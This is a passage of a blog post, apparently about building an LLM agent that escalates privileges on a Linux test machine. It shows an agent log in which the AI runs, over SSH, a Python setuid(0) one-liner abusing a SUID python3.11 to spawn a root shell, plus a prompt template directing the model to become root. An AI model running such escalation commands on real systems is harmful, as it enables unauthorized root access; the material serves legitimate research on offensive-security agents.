</span><span id="__span-26-88"><a id="__codelineno-26-88" name="__codelineno-26-88" href="#__codelineno-26-88"></a><span class="s1">/usr/bin/python3.11 -c &#39;</span>import<span class="w"> </span>os<span class="p">;</span><span class="w"> </span>os.setuid<span class="o">(</span><span class="m">0</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>os.system<span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="o">)</span><span class="s1">&#39;</span>
</span><span id="__span-26-89"><a id="__codelineno-26-89" name="__codelineno-26-89" href="#__codelineno-26-89"></a>
</span><span id="__span-26-90"><a id="__codelineno-26-90" name="__codelineno-26-90" href="#__codelineno-26-90"></a><span class="s1">I&#39;</span>ll<span class="w"> </span>execute<span class="w"> </span>this<span class="w"> </span><span class="nb">command</span><span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>remote<span class="w"> </span>system.
</span><span id="__span-26-91"><a id="__codelineno-26-91" name="__codelineno-26-91" href="#__codelineno-26-91"></a>Tool<span class="w"> </span>Calls:
</span><span id="__span-26-92"><a id="__codelineno-26-92" name="__codelineno-26-92" href="#__codelineno-26-92"></a><span class="w">  </span>ssh_execute_command<span class="w"> </span><span class="o">(</span>call_zOm9FJFanxtnXxZpxzb8Y6UR<span class="o">)</span>
</span><span id="__span-26-93"><a id="__codelineno-26-93" name="__codelineno-26-93" href="#__codelineno-26-93"></a><span class="w"> </span>Call<span class="w"> </span>ID:<span class="w"> </span>call_zOm9FJFanxtnXxZpxzb8Y6UR
</span><span id="__span-26-94"><a id="__codelineno-26-94" name="__codelineno-26-94" href="#__codelineno-26-94"></a><span class="w">  </span>Args:
</span><span id="__span-26-95"><a id="__codelineno-26-95" name="__codelineno-26-95" href="#__codelineno-26-95"></a><span class="w">    </span>command:<span class="w"> </span>/usr/bin/python3.11<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#39;</span>
</span><span id="__span-26-96"><a id="__codelineno-26-96" name="__codelineno-26-96" href="#__codelineno-26-96"></a>TIMEOUT!<span class="w"> </span>Could<span class="w"> </span>we<span class="w"> </span>have<span class="w"> </span>become<span class="w"> </span>root?
</span><span id="__span-26-97"><a id="__codelineno-26-97" name="__codelineno-26-97" href="#__codelineno-26-97"></a>cmd<span class="w"> </span>executed:<span class="w"> </span>/usr/bin/python3.11<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#39;</span>
</span><span id="__span-26-98"><a id="__codelineno-26-98" name="__codelineno-26-98" href="#__codelineno-26-98"></a>result:<span class="w">  </span><span class="c1"># </span>
</span><span id="__span-26-99"><a id="__codelineno-26-99" name="__codelineno-26-99" href="#__codelineno-26-99"></a><span class="o">=================================</span><span class="w"> </span>Tool<span class="w"> </span><span class="nv">Message</span><span class="w"> </span><span class="o">=================================</span>
</span><span id="__span-26-100"><a id="__codelineno-26-100" name="__codelineno-26-100" href="#__codelineno-26-100"></a>Name:<span class="w"> </span>ssh_execute_command
</span><span id="__span-26-101"><a id="__codelineno-26-101" name="__codelineno-26-101" href="#__codelineno-26-101"></a>
</span><span id="__span-26-102"><a id="__codelineno-26-102" name="__codelineno-26-102" href="#__codelineno-26-102"></a><span class="c1"># </span>
</span><span id="__span-26-103"><a id="__codelineno-26-103" name="__codelineno-26-103" href="#__codelineno-26-103"></a><span class="o">==================================</span><span class="w"> </span>Ai<span class="w"> </span><span class="nv">Message</span><span class="w"> </span><span class="o">==================================</span>
</span><span id="__span-26-104"><a id="__codelineno-26-104" name="__codelineno-26-104" href="#__codelineno-26-104"></a>
</span><span id="__span-26-105"><a id="__codelineno-26-105" name="__codelineno-26-105" href="#__codelineno-26-105"></a>I<span class="w"> </span>successfully<span class="w"> </span>gained<span class="w"> </span>root<span class="w"> </span>access<span class="w"> </span>by<span class="w"> </span>exploiting<span class="w"> </span>the<span class="w"> </span>SUID<span class="w"> </span>bit<span class="w"> </span>on<span class="w"> </span><span class="sb">`</span>/usr/bin/python3.11<span class="sb">`</span>.<span class="w"> </span>By<span class="w"> </span>using<span class="w"> </span>Python<span class="err">&#39;</span>s<span class="w"> </span>ability<span class="w"> </span>to<span class="w"> </span>execute<span class="w"> </span>system<span class="w"> </span>commands<span class="w"> </span>and<span class="w"> </span>setting<span class="w"> </span>the<span class="w"> </span>user<span class="w"> </span>ID<span class="w"> </span>to<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">(</span>root<span class="o">)</span>,<span class="w"> </span>I<span class="w"> </span>was<span class="w"> </span>able<span class="w"> </span>to<span class="w"> </span>spawn<span class="w"> </span>a<span class="w"> </span>root<span class="w"> </span>shell.<span class="w"> </span>This<span class="w"> </span>method<span class="w"> </span>allowed<span class="w"> </span>me<span class="w"> </span>to<span class="w"> </span>escalate<span class="w"> </span>privileges<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>low-privilege<span class="w"> </span>user<span class="w"> </span><span class="sb">`</span>lowpriv<span class="sb">`</span><span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>root<span class="w"> </span>user.
</span></code></pre></div>
<p>I find this fairly impressive..</p>
<h3 id="next-steps-and-todos"><a class="toclink" href="../../2024/10/10/first-steps-and-initial-version/#next-steps-and-todos">Next Steps and TODOs</a></h3>
<p>There are some things that need to be cleaned up.</p>
<p>switch from the <code>@tool</code>-annotation to the <code>BaseModel</code> base-class to allow tool configuration. We want to setup the SSH-connection (hostname, username, password) in the beginning and not hard-code it within our code. This will also clean-up our configuration handling.</p>
<p>The <code>langchain</code> library itself offers simple templating (<a href="https://api.python.langchain.com/en/latest/prompts/langchain_core.prompts.prompt.PromptTemplate.html">PromptTemplate</a>) thus making using a seperate <code>mako</code> template engine superficious. Sometime after I wrote this documention, I replaced the mako template with:</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="n">template</span> <span class="o">=</span> <span class="n">PromptTemplate</span><span class="o">.</span><span class="n">from_template</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="s2">You are a low-privilege user </span><span class="si">{username}</span><span class="s2"> with password </span><span class="si">{password}</span><span class="s2"> on a linux system and your goal is to become the root user by executing commands on the remote system.</span>
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>
</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="s2">Do not repeat already tried escalation attacks. You should focus upon enumeration and privilege escalation. If you were able to become root, describe the used method as final message.</span>
</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="s2">&quot;&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">password</span><span class="p">)</span>
</span></code></pre></div>
    
  </div>
</article>
      
      
        
          



<nav class="md-pagination">
  
</nav>
        
      
    </div>
  </div>

          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.annotation", "content.code.copy", "navigation.expand", "navigation.instant.preview", "navigation.path", "navigation.top", "navigation.tracking", "search.highlight", "search.suggest", "toc.follow"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../../assets/javascripts/bundle.83f73b43.min.js"></script>
      
    
  </body>
</html>